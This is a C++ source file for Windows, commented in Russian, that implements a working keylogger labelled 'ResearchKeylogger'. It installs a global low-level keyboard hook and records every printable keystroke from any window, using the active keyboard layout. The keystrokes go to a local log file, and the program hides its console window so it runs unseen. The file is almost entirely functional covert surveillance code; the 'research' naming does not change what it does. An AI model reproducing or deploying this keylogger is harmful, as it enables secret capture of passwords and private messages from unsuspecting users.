#pragma warning(disable : 4996)
#include <iostream>
#include <fstream>
#include <windows.h>
#include <chrono>
#include <thread>
#include <shellapi.h>
#include <map>
#include <string>
#include <vector>

class ResearchKeylogger {
private:
    bool isRunning;
    HHOOK keyboardHook;

    // Функция для обработки Backspace с правильной поддержкой UTF-8
    void HandleBackspace() {
        std::ifstream inFile("EnterTextLog.txt", std::ios::binary);
        if (!inFile.is_open()) return;

        // Читаем весь файл
        inFile.seekg(0, std::ios::end);
        long long fileSize = static_cast<long long>(inFile.tellg());
        inFile.seekg(0, std::ios::beg);

        if (fileSize <= 0) {
            inFile.close();
            return;
        }

        std::string content;
        content.resize(static_cast<size_t>(fileSize));
        inFile.read(&content[0], fileSize);
        inFile.close();

        if (content.empty()) return;

        // Правильно определяем границу последнего UTF-8 символа
        int pos = static_cast<int>(content.size()) - 1;
        int bytesToRemove = 1;

        // Ищем начало UTF-8 символа (байт, который не является continuation byte)
        while (pos > 0) {
            unsigned char ch = static_cast<unsigned char>(content[pos]);
            if ((ch & 0xC0) != 0x80) { // Нашли начало символа
                break;
            }
            pos--;
            bytesToRemove++;
        }

        // Удаляем последний символ
        content.resize(content.size() - bytesToRemove);

        // Перезаписываем файл
        std::ofstream outFile("EnterTextLog.txt", std::ios::binary | std::ios::trunc);
        if (outFile.is_open()) {
            outFile.write(content.c_str(), content.size());
            outFile.close();
        }
    }

    // Упрощенная функция для получения символа
    std::string GetKeyChar(DWORD vkCode, DWORD scanCode) {
        // Получаем активное окно и его раскладку
        HWND foregroundWindow = GetForegroundWindow();
        DWORD threadId = GetWindowThreadProcessId(foregroundWindow, NULL);
        HKL keyboardLayout = GetKeyboardLayout(threadId);

        BYTE keyboardState[256];
        if (!GetKeyboardState(keyboardState)) {
            return "";
        }

        // Для буквенных клавиш устанавливаем правильное состояние Shift/CapsLock
        if (vkCode >= 0x41 && vkCode <= 0x5A) { // A-Z
            bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

            if (isCapsLock ^ isShiftPressed) {
                keyboardState[VK_SHIFT] = 0x80; // Включаем Shift
            }
            else {
                keyboardState[VK_SHIFT] = 0x00; // Выключаем Shift
            }
        }

        // Конвертируем с учетом раскладки
        WCHAR charBuffer[16];
        int result = ToUnicodeEx(vkCode, scanCode, keyboardState, charBuffer, 16, 0, keyboardLayout);

        if (result > 0) {
            // Конвертируем WideChar в MultiByte (UTF-8)
            char mbBuffer[16];
            int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, charBuffer, result, mbBuffer, 16, NULL, NULL);
            if (bytesWritten > 0) {
                mbBuffer[bytesWritten] = '\0';
                return std::string(mbBuffer);
            }
        }

        return "";
    }

    // Проверяем, является ли клавиша печатной
    bool IsPrintableKey(DWORD vkCode) {
        // Пропускаем специальные клавиши
        if (vkCode >= VK_F1 && vkCode <= VK_F24) return false;

        // Пропускаем управляющие клавиши (кроме пробела и Enter)
        if (vkCode == VK_SPACE || vkCode == VK_RETURN) return true;

        if (vkCode <= VK_ESCAPE) return false;
        if (vkCode >= VK_LWIN && vkCode <= VK_RMENU) return false;
        if (vkCode >= VK_NUMLOCK && vkCode <= VK_SCROLL) return false;

        // Разрешаем буквы, цифры и символы
        if (vkCode >= 0x30 && vkCode <= 0x39) return true; // 0-9
        if (vkCode >= 0x41 && vkCode <= 0x5A) return true; // A-Z
        if (vkCode >= 0xBA && vkCode <= 0xC0) return true; // ; : , - . / `
        if (vkCode >= 0xDB && vkCode <= 0xDF) return true; // [ \ ] '

        return false;
    }

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

            // Пропускаем повторные нажатия (auto-repeat)
            if (kbStruct->flags & LLKHF_UP) {
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            ResearchKeylogger logger;

            // Обрабатываем Backspace отдельно
            if (kbStruct->vkCode == VK_BACK) {
                logger.HandleBackspace();
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            // Записываем только печатные символы
            if (logger.IsPrintableKey(kbStruct->vkCode)) {
                std::string keyChar = logger.GetKeyChar(kbStruct->vkCode, kbStruct->scanCode);

                if (!keyChar.empty()) {
                    std::ofstream file("EnterTextLog.txt", std::ios::app | std::ios::binary);
                    if (file.is_open()) {
                        file << keyChar;
                        file.close();
                    }
                }
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

public:
    ResearchKeylogger() : isRunning(false), keyboardHook(nullptr) {}
 
    void startResearch() {
        if (isRunning) return;

        // Создаем файл и записываем заголовок  
        std::ofstream file("EnterTextLog.txt", std::ios::app | std::ios::binary);
        if (file.is_open()) {
            auto now = std::chrono::system_clock::now();
            auto time_t = std::chrono::system_clock::to_time_t(now);
            std::string timeStr = std::ctime(&time_t);
            if (!timeStr.empty() && timeStr.back() == '\n') {
                timeStr.pop_back();
            }
            file << "\n=== Research Session Started: " << timeStr << " ===\n";
            file.close();
        }

        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        if (keyboardHook) {
            isRunning = true;

            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) && isRunning) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }
    }

    ~ResearchKeylogger() {
        if (keyboardHook) {
            UnhookWindowsHookEx(keyboardHook);
        }
    }
};

void RunHiddenKeylogger() {
    ResearchKeylogger researcher;
    researcher.startResearch();
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    RunHiddenKeylogger();
    return 0;
}